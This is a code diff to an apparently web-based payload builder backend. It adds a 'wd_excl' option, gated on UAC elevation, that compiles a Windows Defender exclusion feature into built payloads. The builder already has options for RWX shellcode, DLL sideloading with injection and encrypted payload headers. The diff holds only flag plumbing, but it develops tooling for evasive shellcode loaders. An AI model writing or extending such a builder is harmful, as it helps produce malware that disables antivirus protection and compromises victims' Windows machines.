@@ -291,6 +291,7 @@ def _save_build_history(
         "rwx":            bool(data.get("rwx")),
         "debug":          bool(data.get("debug")),
         "inject":         bool(data.get("inject")) and mode == "sideload",
+        "wd_excl":        bool(data.get("wd_excl")) and bool(data.get("uac")),
         "zip_name":       zip_info.get("name") if zip_info else None,
         "zip_size":       zip_info.get("size", 0) if zip_info else 0,
         "sideload_h_size": sideload_h_size,
@@ -634,10 +635,11 @@ def api_build():
     mode  = data.get("mode", "exe")
     if mode not in VALID_MODES:
         return jsonify({"ok": False, "stderr": f"invalid mode: {mode}"}), 400
-    uac    = bool(data.get("uac"))
-    rwx    = bool(data.get("rwx"))
-    debug  = bool(data.get("debug"))
-    inject = bool(data.get("inject")) and mode == "sideload"
+    uac     = bool(data.get("uac"))
+    rwx     = bool(data.get("rwx"))
+    debug   = bool(data.get("debug"))
+    inject  = bool(data.get("inject")) and mode == "sideload"
+    wd_excl = bool(data.get("wd_excl")) and uac
 
     # ── Payload.h: copy from encrypt history if requested ────────────────
     enc_hist_id = (data.get("encrypt_history_id") or "").strip()
@@ -712,9 +714,10 @@ def api_build():
 
     env    = os.environ.copy()
     extras: list[str] = []
-    if rwx:    extras.append("/DRWX_SHELLCODE")
-    if debug:  extras.append("/DDEBUG")
-    if inject: extras.append("/DENABLE_INJECT")
+    if rwx:      extras.append("/DRWX_SHELLCODE")
+    if debug:    extras.append("/DDEBUG")
+    if inject:   extras.append("/DENABLE_INJECT")
+    if wd_excl:  extras.append("/DENABLE_WD_EXCL")
     if extras:
         env["CFLAGS_EXTRA"] = " ".join(extras)
 
@@ -1009,6 +1012,7 @@ def api_profiles_build_create():
         "rwx":                 bool(data.get("rwx")),
         "debug":               bool(data.get("debug")),
         "inject":              bool(data.get("inject")),
+        "wd_excl":             bool(data.get("wd_excl")),
         "created_at":          int(time.time()),
     }
     profiles = _load_profiles()
@@ -1049,6 +1053,7 @@ def api_profiles_update(pid):
             "rwx":                bool(data.get("rwx")),
             "debug":              bool(data.get("debug")),
             "inject":             bool(data.get("inject")),
+            "wd_excl":            bool(data.get("wd_excl")),
         })
     existing.update(update)
     profiles[idx] = existing
